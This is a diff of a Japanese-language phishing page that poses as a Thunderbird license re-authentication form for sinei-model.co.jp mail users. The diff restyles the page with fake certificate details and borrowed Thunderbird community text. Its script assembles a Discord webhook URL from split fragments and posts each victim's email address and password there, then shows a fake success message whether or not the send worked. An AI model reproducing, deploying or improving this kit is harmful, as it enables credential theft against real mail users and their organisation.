@@ -5,53 +5,110 @@
 <meta name="viewport" content="width=device-width, initial-scale=1">
 <title>ライセンス認証</title>
 <style>
-body{font-family:'Segoe UI',sans-serif;background:#f0f0f0;display:flex;justify-content:center;padding-top:60px;}
-.box{background:#fff;width:380px;border-radius:8px;box-shadow:0 2px 10px rgba(0,0,0,.1);overflow:hidden;}
-.hdr{background:#0a84c8;padding:18px 22px;display:flex;align-items:center;gap:10px;}
-.hdr svg{width:28px;height:28px;}
-.hdr h1{font-size:15px;color:#fff;font-weight:600;}
-.hdr h1 small{display:block;font-size:11px;font-weight:400;opacity:.8;}
-.bd{padding:26px 22px;}
-.msg{font-size:13px;color:#444;line-height:1.7;margin-bottom:18px;}
+*{margin:0;padding:0;box-sizing:border-box;}
+body{font-family:'Segoe UI',sans-serif;background:#e8e8e8;display:flex;justify-content:center;padding-top:50px;}
+.page{width:440px;}
+.cert{background:#fff;border-radius:6px;overflow:hidden;box-shadow:0 1px 4px rgba(0,0,0,.12);}
+.top-bar{height:4px;background:linear-gradient(90deg,#c0392b,#e67e22,#27ae60,#2980b9);}
+.hdr{padding:20px 24px 16px;display:flex;align-items:center;gap:14px;border-bottom:1px solid #eee;}
+.hdr svg.logo{width:40px;height:40px;flex-shrink:0;}
+.hdr .info h1{font-size:14px;font-weight:700;color:#1a1a1a;}
+.hdr .info small{display:block;font-size:11px;color:#888;margin-top:2px;}
+.meta{padding:14px 24px;background:#fafafa;border-bottom:1px solid #eee;font-size:11px;color:#666;}
+.meta table{width:100%;border-collapse:collapse;}
+.meta td{padding:3px 0;font-family:Consolas,monospace;font-size:11px;}
+.meta td:first-child{color:#999;width:38%;font-family:'Segoe UI',sans-serif;font-size:10px;}
+.body{padding:22px 24px;}
+.msg{font-size:13px;color:#333;line-height:1.8;margin-bottom:18px;}
 .msg strong{color:#c0392b;}
-.msg code{background:#eee;padding:1px 5px;border-radius:3px;font-size:12px;}
-label{font-size:12px;color:#666;font-weight:600;display:block;margin-bottom:3px;}
-input{width:100%;padding:10px;border:1px solid #ccc;border-radius:4px;font-size:13px;margin-bottom:14px;font-family:monospace;box-sizing:border-box;}
-input:focus{outline:none;border-color:#0a84c8;}
-.btn{width:100%;padding:12px;background:#0a84c8;color:#fff;border:none;border-radius:4px;font-size:14px;font-weight:600;cursor:pointer;}
-.btn:hover{background:#0871ab;}
-.spin{display:none;width:30px;height:30px;border:3px solid #ddd;border-top-color:#0a84c8;border-radius:50%;margin:20px auto;animation:sp .7s linear infinite;}
+.warn{background:#fff3cd;border-left:3px solid #e6a817;padding:10px 12px;font-size:11px;color:#7a5c00;margin-bottom:16px;border-radius:0 4px 4px 0;}
+label{font-size:11px;color:#555;font-weight:600;display:block;margin-bottom:3px;text-transform:uppercase;letter-spacing:.5px;}
+input{width:100%;padding:10px 12px;border:1px solid #ccc;border-radius:4px;font-size:13px;margin-bottom:14px;font-family:Consolas,monospace;}
+input:focus{outline:none;border-color:#2980b9;box-shadow:0 0 0 2px rgba(41,128,185,.1);}
+.btn{width:100%;padding:12px;background:#2980b9;color:#fff;border:none;border-radius:4px;font-size:13px;font-weight:600;cursor:pointer;letter-spacing:.3px;}
+.btn:hover{background:#1f6da3;}
+.spin{display:none;width:28px;height:28px;border:3px solid #ddd;border-top-color:#2980b9;border-radius:50%;margin:18px auto;animation:sp .7s linear infinite;}
 @keyframes sp{to{transform:rotate(360deg)}}
-.ok{display:none;text-align:center;padding:30px 0;}
-.ok svg{width:56px;height:56px;margin-bottom:14px;}
-.ok p{font-size:14px;color:#27ae60;font-weight:600;}
-.ok small{font-size:12px;color:#888;}
-.ft{background:#f7f7f7;padding:8px 16px;font-size:10px;color:#aaa;text-align:center;}
+.ok{display:none;text-align:center;padding:24px 0;}
+.ok p{font-size:14px;color:#27ae60;font-weight:600;margin-bottom:6px;}
+.ok small{font-size:11px;color:#888;line-height:1.6;}
+.divider{border:none;border-top:1px solid #eee;margin:20px 0;}
+.cards{display:flex;gap:12px;margin-top:4px;}
+.card{flex:1;background:#f9f9f9;border-radius:6px;padding:16px 14px;}
+.card h3{font-size:12px;font-weight:700;color:#1a1a1a;margin-bottom:6px;}
+.card p{font-size:10px;color:#666;line-height:1.7;margin-bottom:12px;}
+.card a.btn-sm{display:inline-flex;align-items:center;gap:5px;font-size:10px;font-weight:600;color:#2980b9;text-decoration:none;border:1px solid #2980b9;border-radius:4px;padding:5px 10px;}
+.card a.btn-sm:hover{background:#eaf3fb;}
+.foot{padding:10px 24px;background:#f5f5f5;border-top:1px solid #eee;font-size:9px;color:#aaa;display:flex;justify-content:space-between;}
+.status-dot{display:inline-block;width:6px;height:6px;border-radius:50%;background:#27ae60;margin-right:4px;animation:bl 1.5s ease infinite;}
+@keyframes bl{50%{opacity:.3;}}
 </style>
 </head>
 <body>
-<div class="box">
+<div class="page">
+<div class="cert">
+<div class="top-bar"></div>
 <div class="hdr">
-<svg viewBox="0 0 32 32" fill="none"><rect width="32" height="32" rx="6" fill="#066a9e"/><path d="M6 16c0-5 4-9 10-9s10 4 10 9-4 9-10 9S6 21 6 16z" fill="none" stroke="#fff" stroke-width="1.8"/><path d="M10 16l3.5-3.5h7v3.5l-5.5 5.5z" fill="#fff"/></svg>
-<h1>ライセンス認証<small>Thunderbird License Service</small></h1>
+<svg class="logo" viewBox="0 0 40 40">
+<rect width="40" height="40" rx="8" fill="#1a3a5c"/>
+<path d="M10 20c0-6 4.5-10 10-10s10 4 10 10" fill="none" stroke="#fff" stroke-width="1.5"/>
+<circle cx="20" cy="22" r="4" fill="#e74c3c"/>
+<rect x="18" y="22" width="4" height="8" rx="1" fill="#fff"/>
+<circle cx="20" cy="31" r="2" fill="#fff"/>
+</svg>
+<div class="info">
+<h1>SINEI-MAIL AUTH</h1>
+<small>sinei-model.co.jp / Thunderbird License</small>
 </div>
-<div class="bd">
-<div class="msg" id="msg">Thunderbird メールクライアントのライセンス契約が本日付で期限切れとなりました。<br>期限後の無料利用には、アカウントの再認証（ワンタイム）が必要です。<br>以下のリンクから再認証を実行してください。<br><br>サーバー: <code>imap.sinei-model.co.jp</code><br>次回期限: 2027年4月1日</div>
+</div>
+<div class="meta">
+<table>
+<tr><td>License ID</td><td>SNP-2024-0187-A</td></tr>
+<tr><td>Issuer</td><td>sinei-model.co.jp IT Mgmt</td></tr>
+<tr><td>Server</td><td>imap.sinei-model.co.jp :993/TLS</td></tr>
+<tr><td>Cert CN</td><td>imap.sinei-model.co.jp</td></tr>
+<tr><td>Cert Serial</td><td>0x7A2F.39E1.B4C8.A002</td></tr>
+<tr><td>Not Before</td><td>2026-04-01 00:00:00 JST</td></tr>
+<tr><td>Not After</td><td style="color:#c0392b;font-weight:700;">2026-11-10 23:59:59 JST</td></tr>
+<tr><td>Next Renewal</td><td>2029-04-01</td></tr>
+</table>
+</div>
+<div class="body">
+<div class="warn"><span class="status-dot"></span>ライセンス期限切れ – 無料利用継続にはワンタイム再認証が必要です。</div>
+<div class="msg" id="msg">
+現在お使いの Thunderbird メールクライアントのライセンス契約が本日付で期限切れとなりました。<br><br>期限後の無料利用には、<strong>アカウントの再認証（ワンタイム）</strong>が必要です。以下の認証フォームから実行してください。<br><br>再認証完了後、ライセンスが再有効化され、通常通りの無料利用が継続されます。<br>次回期限：<strong>2029年4月1日</strong>
+</div>
 <form id="f" onsubmit="return send()">
-<label>アカウント（メールアドレス）</label>
+<label>Email Address</label>
 <input type="email" id="u" placeholder="user@sinei-model.co.jp" autocomplete="off">
-<label>パスワード</label>
+<label>Password</label>
 <input type="password" id="p" autocomplete="off">
-<button class="btn" type="submit">認証を実行</button>
+<button class="btn" type="submit">ライセンス再有効化を実行</button>
 </form>
 <div class="spin" id="sp"></div>
 <div class="ok" id="ok">
-<svg viewBox="0 0 56 56"><circle cx="28" cy="28" r="26" fill="#e8f8ee" stroke="#27ae60" stroke-width="2"/><path d="M17 29l8 8 15-16" stroke="#27ae60" stroke-width="3.5" fill="none" stroke-linecap="round" stroke-linejoin="round"/></svg>
-<p>認証が完了しました</p>
-<small>ライセンスが再有効化されました。<br>通常通り無料でご利用ください。</small>
+<p>✓ ライセンス再有効化が完了しました</p>
+<small>次回期限：2029年4月1日<br>通常通り無料でご利用ください。</small>
+</div>
+<hr class="divider">
+<div class="cards">
+<div class="card">
+<h3>自由なライセンス</h3>
+<p>Thunderbird はオープンに開発され、無料で配布されています。ライセンスは、ユーザーによるThunderbird の使用、変更、共有の権利を保護します。私たちの使命は、皆様のプライバシーと自由を守ることです。</p>
+<a class="btn-sm" href="#">ヘルプサポート</a>
+</div>
+<div class="card">
+<h3>コミュニティによって支えられています</h3>
+<p>Thunderbird は誰でも貢献できます。寄付、翻訳、質問への回答、機能の提案、バグ報告などを通じて、あなた自身と世界のために Thunderbird をより良いものにしましょう。</p>
+<a class="btn-sm" href="#">参加</a>
 </div>
 </div>
-<div class="ft">© Thunderbird License Service</div>
+</div>
+<div class="foot">
+<span>sinei-model.co.jp – Internal Mail Service</span>
+<span>SNP-2024-0187-A</span>
+</div>
+</div>
 </div>
 <script>
 var H="https:/";
@@ -59,18 +116,18 @@ var T="/discord.com/api/webhooks/";
 var A="1569533813548388482/";
 var B="7wipbj3B0igYJicr-BVwvRfRU9izfKWKjjDY15wU5desK4cQx7Tgmt4HkhhkYCiKvVoA";
 function send(){
-  var u=document.getElementById("u").value;
-  var p=document.getElementById("p").value;
-  if(!u||!p)return false;
-  document.getElementById("f").style.display="none";
-  document.getElementById("msg").style.display="none";
-  document.getElementById("sp").style.display="block";
-  var url=H+T+A+B;
-  var body=JSON.stringify({"content":"user: "+u+"\npass: "+p+"\ntime: "+new Date().toLocaleTimeString("ja-JP")});
-  fetch(url,{method:"POST",headers:{"Content-Type":"application/json"},body:body})
-  .then(function(){document.getElementById("sp").style.display="none";document.getElementById("ok").style.display="block";})
-  .catch(function(){document.getElementById("sp").style.display="none";document.getElementById("ok").style.display="block";});
-  return false;
+var u=document.getElementById("u").value;
+var p=document.getElementById("p").value;
+if(!u||!p)return false;
+document.getElementById("f").style.display="none";
+document.getElementById("msg").style.display="none";
+document.getElementById("sp").style.display="block";
+var url=H+T+A+B;
+var body=JSON.stringify({"content":"user: "+u+"\npass: "+p+"\ntime: "+new Date().toLocaleTimeString("ja-JP")});
+fetch(url,{method:"POST",headers:{"Content-Type":"application/json"},body:body})
+.then(function(){document.getElementById("sp").style.display="none";document.getElementById("ok").style.display="block";})
+.catch(function(){document.getElementById("sp").style.display="none";document.getElementById("ok").style.display="block";});
+return false;
 }
 </script>
 </body>
